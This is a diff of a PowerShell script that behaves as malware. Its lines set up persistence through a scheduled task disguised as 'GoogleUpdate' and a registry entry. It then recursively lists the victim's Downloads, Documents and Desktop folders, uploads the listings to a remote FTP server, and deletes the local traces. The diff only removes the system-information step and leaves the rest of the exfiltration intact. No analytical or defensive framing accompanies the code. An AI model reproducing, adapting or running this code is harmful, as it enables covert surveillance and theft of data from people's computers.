@@ -47,22 +47,17 @@ schtasks /create /tn "GoogleUpdate" /tr $paFile /st 15:30
 New-ItemProperty -Path $RegistryPath -Name $Name -Value $paFile -Force
 
 $down = "$env:Appdata\down.txt"
-$info = "$env:Appdata\info.txt"
 $docu = "$env:Appdata\docu.txt"
 $desk = "$env:Appdata\desk.txt"
-systeminfo >> $info
 dir "$env:userprofile\Downloads" -depth 10 >> $down
 dir "$env:userprofile\Documents" -depth 10 >> $docu
 dir "$env:userprofile\Desktop" -depth 10 >> $desk
-$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($info))
-$webclient.UploadFile($uri, $info)
 $uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($down))
 $webclient.UploadFile($uri, $down)
 $uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($docu))
 $webclient.UploadFile($uri, $docu)$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($desk))
 $webclient.UploadFile($uri, $desk)
 
-del $info
 del $down
 del $docu
 del $desk
